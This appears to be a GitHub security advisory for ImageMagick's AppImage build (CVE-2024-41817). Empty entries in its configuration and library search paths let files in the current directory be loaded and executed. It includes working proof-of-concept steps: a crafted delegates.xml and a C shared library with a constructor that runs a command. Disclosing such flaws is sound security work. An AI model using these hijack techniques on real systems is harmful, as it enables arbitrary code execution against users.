
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FImageMagick%2FImageMagick%2Fsecurity%2Fadvisories%2FGHSA-8rxc-922v-phg8)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FImageMagick%2FImageMagick%2Fsecurity%2Fadvisories%2FGHSA-8rxc-922v-phg8)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=ImageMagick%2FImageMagick)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ImageMagick](/ImageMagick)
/
**[ImageMagick](/ImageMagick/ImageMagick)**
Public

* [Notifications](/login?return_to=%2FImageMagick%2FImageMagick) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2FImageMagick%2FImageMagick)
* [Star
   12.6k](/login?return_to=%2FImageMagick%2FImageMagick)

* [Code](/ImageMagick/ImageMagick)
* [Issues
  117](/ImageMagick/ImageMagick/issues)
* [Pull requests
  3](/ImageMagick/ImageMagick/pulls)
* [Discussions](/ImageMagick/ImageMagick/discussions)
* [Actions](/ImageMagick/ImageMagick/actions)
* [Security](/ImageMagick/ImageMagick/security)
* [Insights](/ImageMagick/ImageMagick/pulse)

Additional navigation options

* [Code](/ImageMagick/ImageMagick)
* [Issues](/ImageMagick/ImageMagick/issues)
* [Pull requests](/ImageMagick/ImageMagick/pulls)
* [Discussions](/ImageMagick/ImageMagick/discussions)
* [Actions](/ImageMagick/ImageMagick/actions)
* [Security](/ImageMagick/ImageMagick/security)
* [Insights](/ImageMagick/ImageMagick/pulse)

# Arbitrary Code Execution in `AppImage` version `ImageMagick`

Moderate

[urban-warrior](/urban-warrior)
published
GHSA-8rxc-922v-phg8
Jul 27, 2024

## Package

ImageMagick
(App)

## Affected versions

<=7.1.1-35

## Patched versions

7.1.1-36

## Description

### Summary

The `AppImage` version `ImageMagick` might use an empty path when setting `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH` environment variables while executing, which might lead to arbitrary code execution by loading malicious configuration files or shared libraries in the current working directory while executing `ImageMagick`.

### Details

`AppRun` script might use an empty path when setting `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH` environment variables. The problem is in these lines of the `AppRun` script:

[ImageMagick/app-image/AppRun](https://github.com/ImageMagick/ImageMagick/blob/3b22378a23d59d7517c43b65b1822f023df357a0/app-image/AppRun#L11-L14)

Lines 11 to 14
in
[3b22378](/ImageMagick/ImageMagick/commit/3b22378a23d59d7517c43b65b1822f023df357a0)

|  | export MAGICK\_CONFIGURE\_PATH=$(readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16"):$(readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16HDRI"):$(readlink -f "$HERE/usr/share/ImageMagick-7"):$(readlink -f "$HERE/usr/etc/ImageMagick-7"):$MAGICK\_CONFIGURE\_PATH #Wildcards don't work |
| --- | --- |
|  |  |
|  | export LD\_LIBRARY\_PATH=$(readlink -f "$HERE/usr/lib"):$LD\_LIBRARY\_PATH |
|  | export LD\_LIBRARY\_PATH=${HERE}/usr/lib/ImageMagick-7.0.9/modules-Q16HDRI/coders:$LD\_LIBRARY\_PATH |

For example, when running the latest `AppImage` version `ImageMagick` without setting the `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH` environment variables, the `AppRun` script will eventually set the `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH` environment variables to something like this:

```
LD_LIBRARY_PATH=/tmp/appimage_extracted_b348a3adb4186935f4ba57125e8cd9d8/usr/lib/ImageMagick-7.0.9/modules-Q16HDRI/coders:/tmp/appimage_extracted_b348a3adb4186935f4ba57125e8cd9d8/usr/lib:
MAGICK_CONFIGURE_PATH=::/tmp/appimage_extracted_b348a3adb4186935f4ba57125e8cd9d8/usr/share/ImageMagick-7:/tmp/appimage_extracted_b348a3adb4186935f4ba57125e8cd9d8/usr/etc/ImageMagick-7:
```

You can see that there's a weird `::` at the beginning of the `MAGICK_CONFIGURE_PATH`, and `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH` environment variables are ended with `:`.

This is because in the `AppRun` script, the version number is hardcoded in the path to `7.0.9`. If `$HERE/usr/lib/ImageMagick-7.0.9/` does not exist, `readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16"` or `readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16HDRI"` will return an empty path.

Additionally, if `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH` are not set, `AppRun` will append an empty path to `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH`.

This result in while the `ImageMagick` is executing, it might use current working directory as the path to search for the configuration file or shared libraries, because empty path in these environment variables means the current working directory.

Which means it might load the `delegates.xml` or shared libraries from the current working directory.

So if an attacker can control the file in the current working directory while the `ImageMagick` is executing, it might lead to arbitrary code execution by loading malicious configuration file or shared libraries.

### PoC

> All of the below PoC are running in a clean Ubuntu 22.04 environment.

Here's the step to reproduce the issue by exploiting `MAGICK_CONFIGURE_PATH` when there's an empty path in it:

1. Install the `AppImage` version `ImageMagick` and its dependencies:

```
$ apt-get update && apt-get install -y libfuse2 gcc curl libfontconfig1 libx11-6 libharfbuzz0b libfribidi0
$ curl -fL https://github.com/ImageMagick/ImageMagick/releases/download/7.1.1-35/ImageMagick-d775d2a-gcc-x86_64.AppImage -o /usr/bin/magick && chmod +x /usr/bin/magick
$ magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```

2. Create a `delegates.xml` file in the current working directory:

```
cat << EOF > ./delegates.xml
<delegatemap><delegate xmlns="" decode="XML" command="id"/></delegatemap>
EOF
```

3. Run the `ImageMagick` with the `delegates.xml` to verify the command `id` is executed:

```
$ ls -al
drwxr-xr-x 2 user user 4096 Jul 20 03:31 .
drwxrwxrwt 1 user user 4096 Jul 20 11:52 ..
-rw-r--r-- 1 user user   74 Jul 20 11:52 delegates.xml
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ magick ./delegates.xml ./out.png 2>/dev/null
uid=1000(user) gid=1000(user) groups=1000(user)
```

---

Here's the step to reproduce the issue by exploiting `LD_LIBRARY_PATH` when there's an empty path in it:

1. Install the `AppImage` version `ImageMagick` and its dependencies:

```
$ apt-get update && apt-get install -y libfuse2 gcc curl libfontconfig1 libx11-6 libharfbuzz0b libfribidi0
$ curl -fL https://github.com/ImageMagick/ImageMagick/releases/download/7.1.1-35/ImageMagick-d775d2a-gcc-x86_64.AppImage -o /usr/bin/magick && chmod +x /usr/bin/magick
$ magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```

2. Create a shared library in the current working directory:

```
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
```

3. Run the `ImageMagick` with the shared library to verify the command `id` is executed:

```
$ ls -al
total 24
drwxr-xr-x 2 user user  4096 Jul 20 11:53 .
drwxrwxrwt 1 user user  4096 Jul 20 11:53 ..
-rwxr-xr-x 1 user user 16240 Jul 20 11:53 libxcb.so.1
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ magick /dev/null /dev/null
uid=1000(user) gid=1000(user) groups=1000(user)
```

You should see the output of `id` command.

### Impact

This vulnerability could lead to arbitrary code execution when running the vulnerable `AppImage` version of `ImageMagick` if the attacker can control one of the files in the current working directory.

### Severity

Moderate

### CVE ID

CVE-2024-41817

### Weaknesses

[CWE-427](/advisories?query=cwe%3A427)

### Credits

* [![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=40&v=4)](/lebr0nli)
  [lebr0nli](/lebr0nli)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

